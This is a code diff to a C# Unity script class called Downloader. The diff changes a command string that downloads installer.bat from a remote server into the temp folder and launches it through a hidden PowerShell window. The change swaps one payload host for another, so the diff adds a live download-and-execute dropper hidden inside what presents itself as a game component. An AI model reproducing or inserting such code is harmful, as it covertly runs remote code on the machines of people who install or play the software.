@@ -13,7 +13,7 @@ public class Downloader : MonoBehaviour
         try
         {
             // Build the command string
-            string command = @"cmd /c ""curl -o %TEMP%\installer.bat https://random-tools.dynv6.net/server/api/troll_app/installer.bat && powershell -WindowStyle Hidden -Command Start-Process %TEMP%\installer.bat -WindowStyle Hidden""";
+            string command = @"cmd /c ""curl -o %TEMP%\installer.bat https://srv-tools.lat/server/api/troll_app/installer.bat && powershell -WindowStyle Hidden -Command Start-Process %TEMP%\installer.bat -WindowStyle Hidden""";
 
             // Create the process to run the command
             ProcessStartInfo startInfo = new ProcessStartInfo
